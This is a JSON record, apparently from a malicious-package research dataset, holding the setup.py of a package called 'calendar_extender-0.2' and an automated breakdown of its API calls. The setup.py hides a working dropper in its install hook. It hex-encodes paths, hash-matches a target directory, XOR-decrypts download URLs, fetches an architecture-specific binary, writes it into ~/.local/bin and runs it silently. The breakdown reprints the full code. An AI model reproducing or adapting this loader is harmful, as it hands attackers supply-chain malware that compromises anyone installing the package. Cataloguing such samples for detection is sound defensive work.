[
  {
    "pyfile": "setup.py",
    "code_snippet": "import subprocess\nimport platform\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom setuptools.command.install import install\n\nICON = [\n\tbytes.fromhex(\n\t\t\"8dcf1b5c290b7463c9ab9044a285c652e5479b24344e7fb827dae8407e077528\"\n\t),\n\tbytes.fromhex(\n\t\t\"b526e970df3039acfaece7c6f6b97ebc652a97450ad389d924a2a5d74ad0edbe0e1e4bf6245a94abd03f8351d1c7fb47d47c0fe065d107a2d05dac00317048c236a94f4fab665669b8\"\n\t),\n\tbytes.fromhex(\n\t\t\"6562d84bb8c9c32b89488b8f13fd4d28640b896298e06a81afd3f5e25654a14e0bb11b327feb5428791bcee129a97c432b0060cffc60e34890ccc747dc99cf75654ce49e3951ff4ebc\"\n\t),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f536861726564\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\"6372616674\"),\n\tbytes.fromhex(\"726962626f6e\"),\n\tbytes.fromhex(\"656666656374\"),\n\tbytes.fromhex(\"6a61636b6574\"),\n]\n\ndef gen(v: bytes, /):\n    def iter(v: bytes, /):\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n        yield b\n\ndef CustomRun(path: bytes, /) -> None:\n    run1 = gen(ICON[5] + path)\n    run2 = gen(ICON[6] + path)\n    run3 = gen(ICON[7] + path)\n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    item1 = ''.join(chr(b ^ k) for b, k in zip(ICON[1], run2))\n    item2 = ''.join(chr(b ^ k) for b, k in zip(ICON[2], run3))\n    url = {\n        \"x86_64\": item1,\n        \"arm64\": item2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out = []\n    for b, k in zip(buf, run1):\n        out.append(b ^ k)\n    binary_path = os.path.join(local_bin_path, 'calendar_extender')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)\n    with open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in ICON[3].glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n            to_hash = ICON[4]  + path_bytes\n            stream = gen(to_hash)\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n            if first_n_bytes == ICON[0]:\n                CustomRun(path_bytes)\n                break",
    "pattern_analysis": {
      "api_sequence": [
        "hashlib.sha3_512",
        "os.path.expanduser",
        "os.makedirs",
        "platform.machine",
        "requests.get",
        "os.path.join",
        "open",
        "open",
        "os.chmod",
        "subprocess.Popen",
        "setuptools.command.install.install.run",
        "pathlib.Path.glob",
        "open"
      ],
      "api_sequence_with_args": [
        "hashlib.sha3_512(v)",
        "os.path.expanduser('~/.local/bin')",
        "os.makedirs(local_bin_path, exist_ok=True)",
        "platform.machine()",
        "requests.get(url)",
        "os.path.join(local_bin_path, 'calendar_extender')",
        "open(binary_path, 'wb')",
        "open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w')",
        "os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)",
        "subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)",
        "setuptools.command.install.install.run(self)",
        "pathlib.Path.glob('C*/*r*/2*/*')",
        "open(path, 'rb')"
      ],
      "mapped_sequence": [
        {
          "api_name": "hashlib.sha3_512",
          "id": "create_sha3_512_hash",
          "description": "Creates SHA-3 512 hash object from input bytes",
          "first_id": "encryption_hashing",
          "second_id": "hash_calculation",
          "third_id": "hash_object_creation"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "platform.machine",
          "id": "get_machine_type",
          "description": "Retrieves machine type, e.g., 'x86_64'",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.chmod",
          "id": "change_file_mode_execute",
          "description": "Changes file mode to add execute permission",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_attribute_management"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "pathlib.Path.glob",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        }
      ],
      "contextual_code": "import subprocess\nimport platform\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom setuptools.command.install import install\n\nICON = [\n    bytes.fromhex(...),\n    bytes.fromhex(...),\n    bytes.fromhex(...),\n    Path(bytes.fromhex(...).decode(\"utf-8\")),\n    bytes.fromhex(\"6372616674\"),\n    bytes.fromhex(\"726962626f6e\"),\n    bytes.fromhex(\"656666656374\"),\n    bytes.fromhex(\"6a61636b6574\"),\n]\n\ndef gen(v: bytes, /):\n    def iter(v: bytes, /):\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n        yield b\n\ndef CustomRun(path: bytes, /) -> None:\n    run1 = gen(ICON[5] + path)\n    run2 = gen(ICON[6] + path)\n    run3 = gen(ICON[7] + path)\n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    item1 = ''.join(chr(b ^ k) for b, k in zip(ICON[1], run2))\n    item2 = ''.join(chr(b ^ k) for b, k in zip(ICON[2], run3))\n    url = {\n        \"x86_64\": item1,\n        \"arm64\": item2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out = []\n    for b, k in zip(buf, run1):\n        out.append(b ^ k)\n    binary_path = os.path.join(local_bin_path, 'calendar_extender')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)\n    with open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in ICON[3].glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n            to_hash = ICON[4]  + path_bytes\n            stream = gen(to_hash)\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n            if first_n_bytes == ICON[0]:\n                CustomRun(path_bytes)\n                break"
    }
  },
  {
    "metadata": {
      "package_name": "calendar_extender-0.2"
    }
  }
]